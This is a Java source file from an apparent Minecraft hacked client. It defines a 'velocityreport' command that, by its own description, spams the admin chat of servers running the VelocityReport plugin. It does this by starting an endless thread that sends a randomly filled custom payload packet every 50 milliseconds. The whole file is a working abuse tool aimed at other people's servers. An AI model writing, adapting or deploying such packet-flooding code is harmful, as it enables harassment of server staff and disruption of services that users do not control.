package io.github.spigotrce.paradiseclientfabric.command.impl;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import io.github.spigotrce.paradiseclientfabric.Helper;
import io.github.spigotrce.paradiseclientfabric.ParadiseClient_Fabric;
import io.github.spigotrce.paradiseclientfabric.command.Command;
import io.github.spigotrce.paradiseclientfabric.packet.VelocityReportPayloadPacket;
import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;

import java.util.Random;

/**
 * Represents a command that spams the admin chat of an admin using the VelocityReport plugin.
 *
 * @author SpigotRCE
 * @since 2.30
 */
public class VelocityReportCommand extends Command {
    private static final String CHARACTERS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%&'()*+,-./'";
    private static final Random random = new Random();

    /**
     * Constructs a new instance of {@link VelocityReportCommand}.
     *
     * @param minecraftClient The Minecraft client instance.
     */
    public VelocityReportCommand(MinecraftClient minecraftClient) {
        super("velocityreport", "Spams the admin chat of an admin using the VelocityReport plugin.", minecraftClient);
    }

    /**
     * Builds the command structure using Brigadier's {@link LiteralArgumentBuilder}.
     *
     * @return The built command structure.
     */
    @Override
    public LiteralArgumentBuilder<FabricClientCommandSource> build() {
        return literal(getName())
                .executes(context -> {
                    new Thread(() -> {
                        while (true) {
                            Helper.sendPacket(new CustomPayloadC2SPacket(
                                    new VelocityReportPayloadPacket(Helper.generateRandomString(12, CHARACTERS, random))
                            ));
                            try {
                                Thread.sleep(50);
                            } catch (Exception ignored) {}
                        }
                    }).start();
                    return Command.SINGLE_SUCCESS;
                });
    }
}
